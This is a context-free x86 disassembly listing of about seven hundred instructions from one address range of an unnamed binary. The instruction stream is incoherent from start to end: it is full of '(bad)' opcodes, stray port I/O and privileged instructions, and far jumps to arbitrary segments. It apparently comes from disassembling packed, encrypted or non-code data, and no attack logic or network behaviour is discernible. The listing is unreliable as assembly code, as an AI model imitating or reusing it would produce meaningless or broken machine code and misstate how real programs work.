  411c3b:	and    al,BYTE PTR [ebx+0x4dcd81c5]
  411c41:	das    
  411c42:	xchg   bl,cl
  411c44:	and    DWORD PTR [esi],eax
  411c46:	in     al,dx
  411c47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c48:	ret    
  411c49:	test   al,0x3c
  411c4b:	aas    
  411c4c:	(bad)  
  411c4d:	mov    dl,0xab
  411c4f:	(bad)  
  411c50:	jmp    0x411c93
  411c52:	test   al,0x4e
  411c54:	inc    ecx
  411c55:	add    BYTE PTR [si+0x5f9a],bh
  411c5a:	or     DWORD PTR [ebp+0x51],ebp
  411c5d:	push   0xffffff94
  411c5f:	enter  0x3e10,0xad
  411c63:	out    dx,eax
  411c64:	xor    BYTE PTR [edx+0x39],bh
  411c67:	pusha  
  411c68:	mov    edx,0x76967aa5
  411c6d:	lahf   
  411c6e:	and    edi,DWORD PTR [ebp-0x72436483]
  411c74:	adc    eax,0x4c4f7c0d
  411c79:	mov    dh,0x3
  411c7b:	mov    dl,0x30
  411c7d:	mov    cl,0xfc
  411c7f:	or     bh,al
  411c81:	sbb    eax,0xef317311
  411c86:	cld    
  411c87:	ret    0xd349
  411c8a:	dec    edi
  411c8b:	das    
  411c8c:	or     eax,0xf4631c61
  411c91:	or     bh,BYTE PTR [ecx+0x1e00e53b]
  411c97:	dec    ebp
  411c98:	pop    ss
  411c99:	inc    edi
  411c9a:	mov    ch,dh
  411c9c:	out    dx,al
  411c9d:	pop    esi
  411c9e:	imul   ecx,DWORD PTR [ebx],0x215e29ba
  411ca4:	retf   0xbbeb
  411ca7:	xchg   ebp,eax
  411ca8:	and    DWORD PTR ds:0x88882dc1,eax
  411cae:	jbe    0x411c4d
  411cb0:	(bad)  
  411cb1:	pusha  
  411cb2:	xchg   ecx,eax
  411cb3:	mov    ecx,0x826637b5
  411cb8:	pop    es
  411cb9:	mov    ?,WORD PTR [edx+0x71a261e6]
  411cbf:	outs   dx,BYTE PTR ds:[esi]
  411cc0:	inc    edx
  411cc1:	sbb    ecx,DWORD PTR [edi-0x19]
  411cc4:	retf   
  411cc5:	fwait
  411cc6:	pop    esi
  411cc7:	dec    edx
  411cc8:	scas   eax,DWORD PTR es:[edi]
  411cc9:	clc    
  411cca:	test   bh,ah
  411ccc:	push   esp
  411ccd:	mov    ebx,0x94d6579f
  411cd2:	scas   eax,DWORD PTR es:[edi]
  411cd3:	sub    dh,BYTE PTR [ebx-0x22628509]
  411cd9:	or     dl,cl
  411cdb:	sbb    BYTE PTR [ecx+0x296c7d81],ch
  411ce1:	push   ebp
  411ce2:	sub    dh,BYTE PTR [edx+edx*2]
  411ce5:	sti    
  411ce6:	je     0x411c88
  411ce8:	mov    ds:0x6429097f,al
  411ced:	xchg   ebx,eax
  411cee:	adc    BYTE PTR [ecx-0x19e83f34],ch
  411cf4:	dec    eax
  411cf5:	and    ebx,DWORD PTR [ebx+0x40]
  411cf8:	push   0x1f5d9650
  411cfd:	mov    BYTE PTR [ecx],bh
  411cff:	call   0x3dd5:0x9d212452
  411d06:	xor    dl,BYTE PTR [esi]
  411d08:	sti    
  411d09:	test   eax,0xa2f84257
  411d0e:	mov    ds:0xb7475cd6,eax
  411d13:	fwait
  411d14:	sub    edi,DWORD PTR [esi+0x6bb45d41]
  411d1a:	je     0x411d36
  411d1c:	cld    
  411d1d:	mov    eax,ds:0x2ac9beee
  411d22:	cdq    
  411d23:	xchg   edx,eax
  411d24:	sbb    BYTE PTR [ebp-0x78fb548f],cl
  411d2a:	xchg   esp,eax
  411d2b:	or     BYTE PTR [edi],0x52
  411d2e:	mov    ebp,0x83ae3261
  411d33:	je     0x411cf6
  411d35:	dec    edi
  411d36:	sbb    DWORD PTR [ecx],ebx
  411d38:	and    ebx,DWORD PTR [ebp+0x38a49d94]
  411d3e:	addr16 pop ecx
  411d40:	mov    al,ds:0x65de0730
  411d45:	(bad)  
  411d46:	leave  
  411d47:	in     eax,dx
  411d48:	retf   
  411d49:	fidiv  WORD PTR [ebx+0x78]
  411d4c:	cs xor ch,ch
  411d4f:	lahf   
  411d50:	test   DWORD PTR [eax+0x25],ecx
  411d53:	adc    DWORD PTR [ecx],esp
  411d55:	push   cs
  411d56:	fadd   DWORD PTR [ebx]
  411d58:	pop    ecx
  411d59:	jbe    0x411dbf
  411d5b:	test   DWORD PTR [ebx+ebx*4-0x2b],ecx
  411d5f:	pop    ebp
  411d60:	and    ah,BYTE PTR [ebp+ebp*8+0x7e]
  411d64:	in     al,dx
  411d65:	inc    edi
  411d66:	and    edi,DWORD PTR [edi]
  411d68:	mov    ah,0xcf
  411d6a:	xchg   ebx,eax
  411d6b:	pushf  
  411d6c:	and    DWORD PTR [edx-0x43],0x7d01f0e1
  411d73:	sbb    DWORD PTR [ebp-0x7c57b69c],edi
  411d79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d7a:	lahf   
  411d7b:	xor    al,cl
  411d7d:	mov    ds:0x52d08a24,al
  411d82:	mov    DWORD PTR [eax-0x32],0x77ce9748
  411d89:	add    esp,ebx
  411d8b:	mov    dl,0x2c
  411d8d:	(bad)  [eax+0x33a5f1b]
  411d93:	jmp    0x411d67
  411d95:	xchg   ebp,eax
  411d96:	in     eax,0xd
  411d98:	call   0x9575:0xb47dadb9
  411d9f:	outs   dx,DWORD PTR ds:[esi]
  411da0:	(bad)  
  411da1:	pop    ecx
  411da2:	mov    eax,ds:0x88c46ee
  411da7:	test   ecx,eax
  411da9:	jl     0x411dd2
  411dab:	cmp    bh,BYTE PTR cs:[ecx]
  411dae:	sub    DWORD PTR [eax-0x1928230c],eax
  411db4:	jae    0x411d9f
  411db6:	mov    al,0x72
  411db8:	mov    edx,0x210a9ff6
  411dbd:	mov    al,0x86
  411dbf:	jge    0x411dfe
  411dc1:	or     DWORD PTR [ebp-0x42],edx
  411dc4:	push   esi
  411dc5:	mov    dh,0xff
  411dc7:	add    cl,dh
  411dc9:	sbb    al,0xbf
  411dcb:	arpl   cx,ax
  411dcd:	fwait
  411dce:	sar    dl,0x69
  411dd1:	lea    esp,[edx]
  411dd3:	push   0x37
  411dd5:	add    BYTE PTR [edx+0x7044a918],cl
  411ddb:	loope  0x411d6a
  411ddd:	pop    esp
  411dde:	push   cs
  411ddf:	iret   
  411de0:	or     ebx,DWORD PTR [edi+ebx*4-0x48]
  411de4:	sub    ebx,DWORD PTR [ebx]
  411de6:	mov    ds:0x48eb6942,eax
  411deb:	xor    DWORD PTR [esi+eiz*1+0x3a],edx
  411def:	daa    
  411df0:	mov    BYTE PTR [ebx],cl
  411df2:	ins    BYTE PTR es:[edi],dx
  411df3:	les    esi,FWORD PTR ds:0x836ca9b2
  411df9:	jne    0x411e28
  411dfb:	sub    ecx,DWORD PTR [ecx+0x1e]
  411dfe:	lock cmc 
  411e00:	sbb    al,0xb3
  411e02:	aad    0x6
  411e04:	aas    
  411e05:	add    BYTE PTR ds:0xc2a2e49d,dh
  411e0b:	cld    
  411e0c:	pop    ebp
  411e0d:	in     al,0x7e
  411e0f:	pop    esp
  411e10:	lods   eax,DWORD PTR ds:[esi]
  411e11:	jg     0x411e2d
  411e13:	in     al,0x11
  411e15:	dec    ebp
  411e16:	cli    
  411e17:	and    al,al
  411e19:	frstor [edx]
  411e1b:	sbb    bh,BYTE PTR [ebp+0x2b]
  411e1e:	aad    0x11
  411e20:	jne    0x411e5b
  411e22:	div    BYTE PTR [eax]
  411e24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e25:	add    eax,0x94fdec29
  411e2a:	or     bh,bh
  411e2c:	adc    al,0x1
  411e2e:	aad    0xd0
  411e30:	outs   dx,BYTE PTR ds:[esi]
  411e31:	and    ecx,ecx
  411e33:	jle    0x411e78
  411e35:	daa    
  411e36:	cwde   
  411e37:	mov    ebp,0x9457aca
  411e3c:	pop    ds
  411e3d:	fst    QWORD PTR [edx+0x20]
  411e40:	mov    DWORD PTR [ecx],ebx
  411e42:	iret   
  411e43:	pop    edx
  411e44:	sub    al,0x7c
  411e46:	rcr    DWORD PTR gs:[esi+0x11604e03],0x11
  411e4e:	jb     0x411e64
  411e50:	mov    edi,ebx
  411e52:	popa   
  411e53:	cdq    
  411e54:	shr    DWORD PTR fs:[ebx],cl
  411e57:	ins    BYTE PTR es:[edi],dx
  411e58:	cmp    edi,esi
  411e5a:	arpl   bp,sp
  411e5c:	xchg   esp,eax
  411e5d:	push   ss
  411e5e:	gs fwait
  411e60:	arpl   di,dx
  411e62:	fmul   DWORD PTR [esi-0x59e7645d]
  411e68:	mov    ds:0x2fddb81b,al
  411e6d:	test   bl,bh
  411e6f:	dec    ecx
  411e71:	jbe    0x411e41
  411e73:	or     dl,bl
  411e75:	adc    ecx,ebx
  411e77:	fbld   TBYTE PTR [edx-0x15]
  411e7a:	imul   esi,DWORD PTR [edi-0x25],0x568a17
  411e81:	out    0x10,eax
  411e83:	dec    edx
  411e84:	mov    bh,0x80
  411e86:	call   0x2ca3:0xaf76861a
  411e8d:	aam    0x7
  411e8f:	in     al,0xda
  411e91:	int    0x36
  411e93:	mov    ebx,0x74edc453
  411e98:	push   esi
  411e99:	inc    ecx
  411e9a:	addr16 mov ds:0x1899,eax
  411e9e:	ins    BYTE PTR es:[edi],dx
  411e9f:	add    bl,BYTE PTR [ebp+0x5c2bdfc0]
  411ea5:	sbb    al,BYTE PTR cs:[esp+esi*1-0x51e3af37]
  411ead:	outs   dx,DWORD PTR ds:[esi]
  411eae:	fidiv  DWORD PTR [esi]
  411eb0:	inc    edx
  411eb1:	loop   0x411ee4
  411eb3:	test   dh,dl
  411eb5:	and    edx,ebp
  411eb7:	hlt    
  411eb8:	(bad)  
  411eb9:	pushf  
  411eba:	inc    esp
  411ebb:	pop    esi
  411ebc:	sbb    cl,BYTE PTR [esi+ecx*8]
  411ebf:	iret   
  411ec0:	push   edi
  411ec1:	shl    ch,1
  411ec3:	mov    al,0x74
  411ec5:	addr16 dec eax
  411ec7:	mov    ah,0x88
  411ec9:	in     ax,dx
  411ecb:	sahf   
  411ecc:	mov    dh,0xef
  411ece:	or     BYTE PTR [ebx+0x65],ah
  411ed1:	push   ecx
  411ed2:	or     eax,DWORD PTR [eax-0x6d]
  411ed5:	out    dx,al
  411ed6:	faddp  st(1),st
  411ed8:	and    bh,ah
  411eda:	push   0xffffff89
  411edc:	sub    ebx,DWORD PTR [edx]
  411ede:	mul    BYTE PTR [edi-0x60ed6c86]
  411ee4:	aam    0x53
  411ee6:	mov    bl,0xd
  411ee8:	mov    esi,0xc0432b63
  411eed:	pop    esp
  411eee:	adc    eax,esi
  411ef0:	dec    ecx
  411ef1:	repnz lds ecx,FWORD PTR [esi+0x145db0a7]
  411ef8:	push   es
  411ef9:	push   esp
  411efa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411efb:	ret    
  411efc:	icebp  
  411efd:	ror    DWORD PTR [edi+0x42554369],0xf
  411f04:	jb     0x411ef1
  411f06:	enter  0x17e7,0xbc
  411f0a:	repz idiv ah
  411f0d:	stc    
  411f0e:	shr    eax,cl
  411f10:	push   ss
  411f11:	push   0x51620506
  411f16:	push   es
  411f17:	and    al,0xe3
  411f19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f1a:	or     ah,BYTE PTR [ecx]
  411f1c:	mov    dh,0x4e
  411f1e:	add    eax,0xc0b7661f
  411f23:	or     al,BYTE PTR [edx-0x3abcc56]
  411f29:	js     0x411f51
  411f2b:	push   ecx
  411f2c:	mov    DWORD PTR ds:0x3c2696fe,eax
  411f32:	sub    BYTE PTR [ebp+edx*8-0x159f3076],dh
  411f39:	lock out dx,al
  411f3b:	pop    eax
  411f3c:	and    DWORD PTR [edi],esi
  411f3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f3f:	aad    0x67
  411f41:	or     al,0xb3
  411f43:	xor    BYTE PTR [ecx],al
  411f45:	push   esp
  411f46:	sub    eax,0xb88dc22f
  411f4b:	enter  0xc627,0x93
  411f4f:	out    dx,al
  411f50:	mov    bh,0x5e
  411f52:	in     al,0xca
  411f54:	dec    esp
  411f55:	pop    esi
  411f56:	cdq    
  411f57:	fdiv   st(6),st
  411f59:	cmp    al,dh
  411f5b:	xor    BYTE PTR [esi+ebx*4-0x7c],bh
  411f5f:	std    
  411f60:	mov    ds:0x2fc3a29,al
  411f65:	test   eax,0x33288c04
  411f6b:	ror    esi,0xed
  411f6e:	nop
  411f6f:	mov    eax,ds:0x9338fb55
  411f74:	xchg   edx,eax
  411f75:	popf   
  411f76:	mov    BYTE PTR [ebp-0x6e],al
  411f79:	and    ebp,DWORD PTR [eax-0x1bd7a6ed]
  411f7f:	outs   dx,BYTE PTR ds:[esi]
  411f80:	lds    edi,FWORD PTR [esp+eiz*8+0x6]
  411f84:	aas    
  411f85:	hlt    
  411f86:	mov    edx,0x50e8cf6c
  411f8b:	mov    dl,BYTE PTR [edx+0x3c71270c]
  411f91:	aam    0xb9
  411f93:	xchg   edi,eax
  411f94:	inc    ebx
  411f95:	mov    ss,WORD PTR [esi]
  411f97:	pop    ebx
  411f98:	jmp    FWORD PTR [ebp+0x4617acfc]
  411f9e:	push   edi
  411f9f:	dec    edi
  411fa0:	in     eax,0xf
  411fa2:	sub    ecx,edx
  411fa4:	aaa    
  411fa5:	sbb    BYTE PTR [esi+0x42620ae6],bl
  411fab:	xchg   ebx,eax
  411fac:	data16 fistp DWORD PTR [esi]
  411faf:	in     eax,dx
  411fb0:	xchg   esp,eax
  411fb1:	fistp  QWORD PTR [ebp+0x12b7ffef]
  411fb7:	lods   eax,DWORD PTR es:[esi]
  411fb9:	addr16 ret 0xb003
  411fbd:	ja     0x411fc9
  411fbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fc0:	jmp    0xe8d:0xeedcd0ac
  411fc7:	mov    al,0x28
  411fc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fca:	aas    
  411fcb:	inc    esp
  411fcc:	push   edx
  411fcd:	pusha  
  411fce:	fs add al,0xc
  411fd1:	xchg   edi,eax
  411fd2:	jge    0x411fb6
  411fd4:	out    dx,eax
  411fd5:	icebp  
  411fd6:	cmp    dl,ch
  411fd8:	repnz dec esp
  411fda:	clc    
  411fdb:	mov    esp,0x14edbe65
  411fe0:	(bad)  [esi-0x7a]
  411fe3:	je     0x411f8c
  411fe5:	or     BYTE PTR [ebx],bl
  411fe7:	or     DWORD PTR [ebx+0x7],eax
  411fea:	sbb    cl,BYTE PTR [ecx]
  411fec:	out    dx,al
  411fed:	rol    BYTE PTR [eax-0x30302a58],cl
  411ff3:	push   es
  411ff4:	add    BYTE PTR [edx+ebp*1+0x9],bh
  411ff8:	lea    eax,[eiz*4+0x5f50dd17]
  411fff:	ins    DWORD PTR es:[edi],dx
  412000:	fcmovnu st,st(7)
  412002:	shr    al,1
  412004:	xchg   esp,eax
  412005:	std    
  412006:	out    dx,eax
  412007:	adc    esi,ebx
  412009:	sti    
  41200a:	and    edi,0xffffffd3
  41200d:	and    DWORD PTR ds:0x5a124c36,ecx
  412013:	hlt    
  412014:	mov    cl,0x37
  412016:	sub    BYTE PTR [ebx+0x3b33d204],0x7d
  41201d:	out    0xbe,al
  41201f:	outs   dx,DWORD PTR ds:[esi]
  412020:	arpl   WORD PTR [ebx-0xa3a919d],di
  412026:	hlt    
  412027:	(bad)  
  412028:	push   ecx
  412029:	mov    cl,0xec
  41202b:	call   0x633d:0xf5b71da8
  412032:	int    0x2a
  412034:	sahf   
  412035:	fild   QWORD PTR [ebp-0x69]
  412038:	pop    esp
  412039:	(bad)  
  41203a:	(bad)  
  41203b:	test   al,0xb9
  41203d:	shl    DWORD PTR [ecx-0xd],0xe1
  412041:	mov    al,0x66
  412043:	ins    BYTE PTR es:[edi],dx
  412044:	sahf   
  412045:	ds leave 
  412047:	mov    esp,0xe39db77c
  41204c:	cs jns 0x41202a
  41204f:	jge    0x412042
  412051:	push   edi
  412052:	xchg   DWORD PTR [ecx],ecx
  412054:	wrmsr  
  412056:	sub    DWORD PTR [ebp-0x15],0xffffffd2
  41205a:	jb     0x4120cf
  41205c:	cmp    al,0xa7
  41205e:	int3   
  41205f:	stos   BYTE PTR es:[edi],al
  412060:	scas   al,BYTE PTR es:[edi]
  412061:	pop    ds
  412062:	add    esi,esi
  412064:	xchg   ebp,eax
  412065:	xchg   ebp,eax
  412066:	into   
  412067:	adc    edx,DWORD PTR [eax-0x4021b1c9]
  41206d:	pop    esp
  41206e:	and    eax,esp
  412070:	aam    0x97
  412072:	icebp  
  412073:	jmp    0xfbf0:0x4edbfb8e
  41207a:	nop
  41207b:	mov    edx,0x41e111a8
  412080:	mov    bh,0x0
  412082:	jl     0x4120d1
  412084:	in     eax,0x21
  412086:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412087:	mov    ecx,0xe1dead8b
  41208c:	addr16 mov ds:0xc34,eax
  412090:	xchg   DWORD PTR [ebx+0xa065596],esp
  412096:	int    0x9e
  412098:	pushf  
  412099:	ja     0x412066
  41209b:	mov    esp,0xc228c7e8
  4120a0:	lods   al,BYTE PTR ds:[esi]
  4120a1:	jbe    0x4120b0
  4120a3:	jecxz  0x412038
  4120a5:	mov    al,ds:0xe44d7745
  4120aa:	push   eax
  4120ab:	outs   dx,BYTE PTR ds:[esi]
  4120ac:	cdq    
  4120ad:	scas   al,BYTE PTR es:[edi]
  4120ae:	call   0xa250936e
  4120b3:	and    eax,0x8720596f
  4120b8:	lahf   
  4120b9:	mov    bl,dh
  4120bb:	or     DWORD PTR [esi+0x52ff9505],0xce89684b
  4120c5:	push   ebx
  4120c6:	leave  
  4120c7:	push   es
  4120c8:	(bad)  
  4120c9:	lea    edi,[ecx-0x29fe3ec3]
  4120cf:	daa    
  4120d0:	mov    eax,ds:0x43da9f17
  4120d5:	lea    ebp,[ebx]
  4120d7:	fsub   QWORD PTR [ebx+ecx*4+0x20222863]
  4120de:	das    
  4120df:	pop    edx
  4120e0:	push   ebx
  4120e1:	inc    edx
  4120e2:	push   0x76
  4120e4:	xchg   edx,eax
  4120e5:	push   ecx
  4120e6:	xor    eax,0x180d0355
  4120eb:	ds pop ecx
  4120ed:	outs   dx,DWORD PTR ds:[esi]
  4120ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120ef:	scas   eax,DWORD PTR es:[edi]
  4120f0:	sub    al,0x9b
  4120f2:	cdq    
  4120f3:	adc    DWORD PTR [ecx-0x36],ebx
  4120f6:	dec    edi
  4120f7:	ins    DWORD PTR es:[edi],dx
  4120f8:	sub    al,0xf1
  4120fa:	jne    0x41213d
  4120fc:	and    bh,BYTE PTR [eax-0x86b451e]
  412102:	loopne 0x412172
  412104:	mov    ch,0x22
  412106:	cwde   
  412107:	push   ebx
  412108:	mov    dh,0xc1
  41210a:	imul   eax,DWORD PTR [eax],0xd79665cc
  412110:	jecxz  0x4120bc
  412112:	push   ds
  412113:	ja     0x41217d
  412115:	jmp    0x412111
  412117:	iret   
  412118:	dec    ecx
  412119:	out    dx,al
  41211a:	retf   
  41211b:	test   BYTE PTR [esi],0x25
  41211e:	jmp    0x180af123
  412123:	clc    
  412124:	outs   dx,DWORD PTR ds:[esi]
  412125:	out    0x30,al
  412127:	jecxz  0x4120d7
  412129:	lods   eax,DWORD PTR ds:[esi]
  41212a:	std    
  41212b:	push   ss
  41212c:	mov    ebp,0xd00c8e6d
  412131:	fmul   st,st(5)
  412133:	push   ss
  412134:	or     BYTE PTR [edx-0x5b],0x21
  412138:	pop    es
  412139:	adc    ch,bl
  41213b:	mov    ecx,0xc1ec3178
  412140:	out    0x7e,al
  412142:	test   eax,0x4ba25465
  412147:	push   eax
  412148:	call   DWORD PTR [ebp-0x16]
  41214b:	inc    ebp
  41214c:	call   0xc4e8b62f
  412151:	into   
  412152:	or     al,0xec
  412154:	sub    edx,DWORD PTR [eax-0xa4a6570]
  41215a:	pop    ebp
  41215b:	jnp    0x4121a9
  41215d:	jp     0x4121b9
  41215f:	test   DWORD PTR [ebx-0x1e],0xb3eda6ed
  412166:	mov    ch,0x1
  412168:	jl     0x412147
  41216a:	pop    ds
  41216b:	xchg   ecx,eax
  41216c:	dec    eax
  41216d:	inc    edx
  41216e:	pop    ss
  41216f:	sub    BYTE PTR [esi-0x3d],ah
  412172:	jno    0x412190
  412174:	into   
  412175:	and    eax,0x78a70114
  41217a:	lahf   
  41217b:	scas   eax,DWORD PTR es:[edi]
  41217c:	imul   esi,DWORD PTR [esi+0x518ae339],0x3ab8b218
  412186:	mov    ah,0x6c
  412188:	repnz dec esp
  41218a:	test   DWORD PTR [edi+esi*8-0x2c],0x6378bc9d
  412192:	jmp    0x4121a1
  412194:	or     DWORD PTR [esi],edx
  412196:	cmp    edx,DWORD PTR [ebp+eax*2+0x14]
  41219a:	mov    bl,0x97
  41219c:	cli    
  41219d:	retf   
  41219e:	jmp    0xc2c8:0xb00592e3
  4121a5:	push   ecx
  4121a6:	lahf   
  4121a7:	xchg   DWORD PTR [ebx+0x36],ebp
  4121aa:	push   ebp
  4121ab:	xor    eax,0x5c736dc9
  4121b0:	sub    al,0x22
  4121b2:	cwde   
  4121b3:	dec    esi
  4121b4:	inc    ecx
  4121b5:	cmp    eax,0xc53a8306
  4121ba:	sahf   
  4121bb:	mov    ch,0xb9
  4121bd:	out    dx,al
  4121be:	mov    eax,ds:0x490abfed
  4121c3:	add    al,0x96
  4121c5:	cwde   
  4121c6:	dec    esi
  4121c7:	mov    ch,0x15
  4121c9:	in     al,0x8d
  4121cb:	jnp    0x412213
  4121cd:	sub    BYTE PTR [ecx],ch
  4121cf:	arpl   bp,di
  4121d1:	repnz and DWORD PTR [ebp-0x4f216ad0],edx
  4121d8:	pushf  
  4121d9:	sbb    ebx,ecx
  4121db:	cmp    al,0xca
  4121dd:	xor    eax,0x84cb1569
  4121e2:	cs sbb esi,ecx
  4121e5:	lods   eax,DWORD PTR ds:[esi]
  4121e6:	lods   eax,DWORD PTR ds:[esi]
  4121e7:	jmp    FWORD PTR [edx+ecx*2-0x6c]
  4121eb:	mov    ah,0x52
  4121ed:	jno    0x4121dc
  4121ef:	pop    ecx
  4121f0:	push   ebp
  4121f1:	aam    0x58
  4121f3:	mov    bl,0x37
  4121f5:	inc    ecx
  4121f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121f7:	push   ecx
  4121f8:	std    
  4121f9:	inc    ebp
  4121fa:	push   ebx
  4121fb:	je     0x4121bb
  4121fd:	push   ss
  4121fe:	data16 adc al,bh
  412201:	mov    ecx,0x2123cb8e
  412206:	push   es
  412207:	ins    DWORD PTR es:[edi],dx
  412208:	mov    esp,0x4bd86934
  41220d:	push   0x66
  41220f:	shl    BYTE PTR [ebx+0x6d1a3f2d],1
  412215:	dec    edx
  412216:	sub    al,0x92
  412218:	push   ebp
  412219:	iret   
  41221a:	mov    WORD PTR [ebx-0x54],?
  41221d:	mov    ebp,0xa2dfe995
  412222:	jns    0x4121dd
  412224:	dec    edi
  412225:	fs test al,0xb4
  412228:	pop    eax
  412229:	and    eax,0x8ae3db91
  41222e:	inc    ebx
  41222f:	aad    0xa3
  412231:	inc    esp
  412232:	inc    edx
  412233:	adc    al,0x59
  412235:	xor    bl,ah
  412237:	cdq    
  412238:	stos   DWORD PTR es:[edi],eax
  412239:	imul   esi,edi,0xe69b453
  41223f:	adc    dl,BYTE PTR [eax+0x623c04e5]
  412245:	gs push esp
  412247:	aam    0x90
  412249:	adc    WORD PTR [ebp-0x25ea641b],bp
  412250:	pop    ss
  412251:	ror    BYTE PTR [edx+0x7c],0x60
  412255:	mov    esp,0x5ebc5bd4
  41225a:	mov    ch,0xc6
  41225c:	(bad)  
  41225d:	retf   
  41225e:	imul   DWORD PTR [ebp+0x52]
  412261:	into   
  412262:	sbb    DWORD PTR [ebx],ebx
  412264:	inc    edi
  412265:	sub    BYTE PTR [ecx],dl
  412267:	mov    esi,0x85362b89
  41226c:	sbb    BYTE PTR [esi-0x5fb4de8b],bh
  412272:	jecxz  0x412241
  412274:	jns    0x412274
  412276:	xchg   ecx,eax
  412277:	mov    ebx,0xa4ddf41e
  41227c:	jno    0x41228a
  41227e:	in     al,0xd6
  412280:	mov    ebp,0x8001803c
  412285:	call   0x7e78f4c3
  41228a:	inc    esp
  41228b:	xchg   DWORD PTR [ebx-0x36eb4590],edx
  412291:	cli    
  412292:	(bad)  
  412293:	mov    ch,0xbe
  412295:	inc    esi
  412296:	das    
  412297:	(bad)  
  412299:	cmp    DWORD PTR [eax+0x41037b54],edx
  41229f:	rcr    bl,0x48
  4122a2:	push   ds
  4122a3:	add    esi,DWORD PTR [ebp-0x5b]
  4122a6:	inc    edx
  4122a7:	push   0x536b869a
  4122ac:	xor    ebx,DWORD PTR es:[edx-0x32]
  4122b0:	mov    bh,0x26
  4122b2:	jmp    0xe70fcb27
  4122b7:	fimul  DWORD PTR [edi-0x5a]
  4122ba:	test   al,0x4b
  4122bc:	(bad)  [edx+0x0]
  4122bf:	pop    edx
  4122c0:	dec    ebp
  4122c1:	repnz or BYTE PTR [ebx],cl
  4122c4:	mov    cl,0x1d
  4122c6:	pusha  
  4122c7:	(bad)  
  4122c8:	cs add eax,0x4fcfbd48
  4122ce:	mov    dh,BYTE PTR [esi-0x52]
  4122d1:	ins    BYTE PTR es:[edi],dx
  4122d2:	or     DWORD PTR ds:0x683d,ecx
  4122d7:	ins    BYTE PTR es:[edi],dx
  4122d8:	or     BYTE PTR [ecx+0x3b],ah
  4122db:	dec    esi
  4122dc:	shr    BYTE PTR [edi+0x2f],cl
  4122df:	sbb    edx,ebx
  4122e1:	iret   
  4122e2:	scas   eax,DWORD PTR es:[edi]
  4122e3:	jns    0x4122e1
  4122e5:	aad    0xc8
  4122e7:	sbb    al,0x24
  4122e9:	cwde   
  4122ea:	outs   dx,BYTE PTR ds:[esi]
  4122eb:	push   eax
  4122ec:	ret    
  4122ed:	out    dx,eax
  4122ee:	pop    ecx
  4122ef:	or     DWORD PTR [eax+0x53],esp
  4122f2:	jae    0x4122a6
  4122f4:	mov    WORD PTR ds:0xe2936887,gs
  4122fa:	inc    esi
  4122fb:	mov    dh,0x8f
  4122fd:	sbb    DWORD PTR [esi+0x5552bbae],0xffffffab
  412304:	push   0x2161aed6
  412309:	mov    bh,0x89
  41230b:	adc    esp,edi
  41230d:	jge    0x4122b3
  41230f:	push   ds
  412310:	(bad)  
  412311:	cmp    eax,0x743bf8a2
  412316:	cmp    al,BYTE PTR [ebx-0x77]
  412319:	ins    BYTE PTR es:[edi],dx
  41231a:	neg    DWORD PTR [edx+0x37066cb5]
  412320:	and    esi,DWORD PTR [edx]
  412322:	jnp    0x41237c
  412324:	add    eax,0xe1997d55
  412329:	imul   ebp,DWORD PTR [ecx-0x76b554dd],0xffffff88
  412330:	jmp    0x4123a7
  412332:	lock pusha 
  412334:	cmp    ebx,esp
  412336:	xor    DWORD PTR [ebx-0x1e446a04],esp
  41233c:	inc    edx
  41233d:	push   edi
  41233e:	fldcw  WORD PTR [edi+eax*2-0x5ba3832e]
  412345:	fist   WORD PTR [edi+edx*8+0x11]
  412349:	retf   0x5daa
  41234c:	or     bl,BYTE PTR [ebp+0x5658c4c1]
  412352:	mov    edi,0xaf2212ab
  412357:	shl    DWORD PTR [edi+0xe],0x7b
  41235b:	jne    0x4123a9
  41235d:	not    DWORD PTR [ebp+0x1b121c96]
  412363:	ja     0x412317
  412365:	inc    esp
  412366:	(bad)  
  412367:	cdq    
  412368:	sbb    eax,0x15d04290
  41236d:	sti    
  41236e:	inc    esp
  41236f:	push   edx
  412370:	test   al,0x6f
  412372:	dec    edi
  412373:	mov    DWORD PTR [edi],esi
  412375:	das    
  412376:	ins    DWORD PTR es:[edi],dx
  412377:	jb     0x4123b0
  412379:	out    dx,eax
  41237a:	mov    ebx,DWORD PTR [eax-0x18]
  41237d:	add    al,0xb9
  41237f:	(bad)  
  412380:	out    0xd9,eax
  412382:	(bad)  
  412383:	imul   esp,DWORD PTR [esi+esi*4],0x13
  412387:	mov    ds:0x2a71f4de,al
  41238c:	sar    BYTE PTR [ebx-0x7c],1
  41238f:	ds popa 
  412391:	iret   
  412392:	sbb    al,0xd9
  412394:	pop    ebp
  412395:	mov    al,ds:0x325c6226
  41239a:	xor    BYTE PTR [esi],ch
  41239c:	push   edx
  41239d:	or     ebp,ebp
  41239f:	inc    ecx
  4123a0:	pop    esi
  4123a1:	bound  edi,QWORD PTR [ebx]
  4123a3:	inc    esp
  4123a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123a5:	test   eax,0x1d49015a
  4123aa:	inc    eax
  4123ab:	push   ebp
  4123ac:	adc    DWORD PTR [ebx+edi*8+0x6a],ecx
  4123b0:	fdivp  st(5),st
  4123b2:	jl     0x4123df
  4123b4:	loope  0x412385
  4123b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123b7:	or     al,0x4e
  4123b9:	pop    ebp
  4123ba:	aam    0x99
  4123bc:	fs retf 0x4c00
  4123c0:	sti    
  4123c1:	cmp    al,al
  4123c3:	(bad)  ds:0x3620568b
  4123c9:	imul   ebx,DWORD PTR [ecx-0x4692689b],0x31a67efe
  4123d3:	sub    DWORD PTR [ecx],0x74d958d9
  4123d9:	sub    eax,0xa702cd42
  4123de:	fadd   DWORD PTR [edi+0x66]
  4123e1:	push   es
  4123e2:	dec    ecx
  4123e3:	xlat   BYTE PTR ds:[ebx]
  4123e4:	test   eax,0x3157f36e
  4123e9:	in     al,0x2a
  4123eb:	lods   al,BYTE PTR ds:[esi]
  4123ec:	xchg   edx,eax
  4123ed:	in     eax,0x16
  4123ef:	dec    ecx
